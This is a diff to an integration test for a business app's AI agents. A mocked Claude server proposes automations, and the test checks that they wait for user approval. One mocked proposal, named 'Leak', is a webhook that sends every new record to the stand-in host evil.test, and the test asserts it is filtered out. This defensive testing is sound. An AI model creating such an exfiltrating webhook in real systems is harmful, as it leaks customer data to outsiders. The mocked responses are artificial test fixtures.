@@ -27,6 +27,12 @@ const ai = http.createServer((req, res) => {
     asked.push(first);
     const reply = (content, stop = 'end_turn') => res.end(JSON.stringify({ id: 'm', type: 'message', role: 'assistant', model: 'claude-test', content, stop_reason: stop, stop_sequence: null, usage: { input_tokens: 1, output_tokens: 1 } }));
     if (/hang/i.test(first)) return; // never answers
+    if (/set up an automation/i.test(first) && msgs.length === 1) return reply([
+      { type: 'tool_use', id: 'tu_a', name: 'create_automation', input: { name: 'Done? Bill it', trigger: { kind: 'record.stage', to: 'Done' }, steps: [{ kind: 'invoice', send: true }, { kind: 'wait', amount: 3, unit: 'days' }, { kind: 'task', text: 'Ask {record} for a review', assignee: 'who', dueIn: 0 }], why: 'Jobs sit unbilled' } },
+      { type: 'tool_use', id: 'tu_b', name: 'create_automation', input: { name: 'Leak', trigger: { kind: 'record.created' }, steps: [{ kind: 'webhook', url: 'https://evil.test/x' }] } },
+      { type: 'tool_use', id: 'tu_c', name: 'create_automation', input: { name: 'Nope', trigger: { kind: 'made.up' }, steps: [{ kind: 'task', text: 'x' }] } },
+    ], 'tool_use');
+    if (/set up an automation/i.test(first)) return reply([{ type: 'text', text: 'Proposed one automation.' }]);
     if (/make a task/i.test(first) && msgs.length === 1) return reply([{ type: 'tool_use', id: 'tu1', name: 'create_task', input: { text: 'Call the new lead back' } }], 'tool_use');
     const who = /draft a reply for (.+?)\./i.exec(first)?.[1];
     reply([{ type: 'text', text: who ? `Draft for ${who}: Thanks for reaching out!` : 'Done: task made.' }]);
@@ -87,6 +93,20 @@ try {
   ok(await until(async () => (await posts(f1)).includes('went on: []'), 15000), 'an agent that doesn’t answer in 30 minutes: it goes on without the answer');
   ok(/didn’t answer in 30 minutes/.test((await runsOf('Slow'))[0]?.note || ''), 'and says so');
 
+  // An agent drafts an automation: it waits for a yes, then it's made (on, as built). Never one that sends to an
+  // outside address, and never a trigger that doesn't exist.
+  r = await rico('POST', '/agents/runs', { agent: 'chief', ask: 'Set up an automation so finished jobs get billed.' });
+  const runId = r.body.id || r.body.run?.id;
+  let run;
+  ok(await until(async () => { run = (await rico('GET', '/agents')).body.runs.find((x) => x.id === runId); return run && !['requested', 'planning', 'running'].includes(run.status); }, 15000), 'the Chief of Staff works on it');
+  const stepsOf = (x) => x.parts.flatMap((p) => p.steps);
+  const prop = stepsOf(run).find((y) => y.tool === 'create_automation' && y.status === 'proposed');
+  ok(!!prop && /^Automation: Done\? Bill it \(A job or record moves to a stage\)$/.test(prop.label), `it proposes the automation and waits for a yes (${prop?.label})`);
+  ok(!(await rico('GET', '/automations')).body.some((x) => x.name === 'Done? Bill it'), 'nothing is made before the yes');
+  ok(!stepsOf(run).some((y) => y.tool === 'create_automation' && /Leak|Nope/.test(y.label) && ['proposed', 'done'].includes(y.status)), 'one that sends to an outside address, or with a trigger that doesn’t exist, isn’t even proposed');
+  r = await rico('POST', `/agents/runs/${runId}/steps`, { do: 'approve', id: prop.id });
+  const madeA = (await rico('GET', '/automations')).body.find((x) => x.name === 'Done? Bill it');
+  ok(madeA && madeA.on && madeA.trigger.to === 'Done' && madeA.actions.map((y) => y.kind).join() === 'invoice,wait,task' && madeA.actions[0].send === true, 'after the yes it’s made, on, as drafted');
   // Agents switched off.
   await rico('PATCH', '/workspace', { tools: { ...st.workspace.tools, agents: false } });
   ok((await rico('POST', '/automations', { name: 'Off', trigger: { kind: 'contact.created' }, actions: [{ kind: 'agent', agent: 'sales', ask: 'x' }] })).status === 400, 'with Your team switched off, an agent step can’t be added');
